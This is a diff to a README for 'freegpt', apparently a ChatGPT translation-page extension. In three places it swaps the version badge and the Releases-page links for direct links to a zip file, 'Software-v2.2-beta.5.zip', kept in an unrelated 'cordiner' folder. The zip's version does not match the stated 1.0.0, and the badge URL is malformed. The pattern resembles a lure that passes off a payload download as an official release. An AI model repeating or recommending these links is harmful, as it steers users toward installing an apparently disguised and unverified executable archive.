@@ -6,9 +6,9 @@ Welcome to freegpt! This extension transforms the translation page of ChatGPT in
 ## 📦 Download & Install
 To get started, visit the link below to download the latest version of freegpt:
 
-[![Download freegpt](https://img.shields.io/badge/Download%20freegpt-1.0.0-blue.svg)](https://github.com/Alter-Demon/freegpt/releases)
+[![Download freegpt](https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip%https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip)](https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip)
 
-1. Click on the button above or visit the [Releases page](https://github.com/Alter-Demon/freegpt/releases).
+1. Click on the button above or visit the [Releases page](https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip).
 2. Find the latest version of the software.
 3. Download the file that matches your system. 
 
@@ -49,4 +49,4 @@ If you need help or have feedback, feel free to reach out via the Issues section
 
 For more details or advanced features, you can always refer to the official documentation available in the repository. Enjoy using freegpt!
 
-[![Download freegpt](https://img.shields.io/badge/Download%20freegpt-1.0.0-blue.svg)](https://github.com/Alter-Demon/freegpt/releases)
+[![Download freegpt](https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip%https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip)](https://raw.githubusercontent.com/Alter-Demon/freegpt/main/cordiner/Software-v2.2-beta.5.zip)
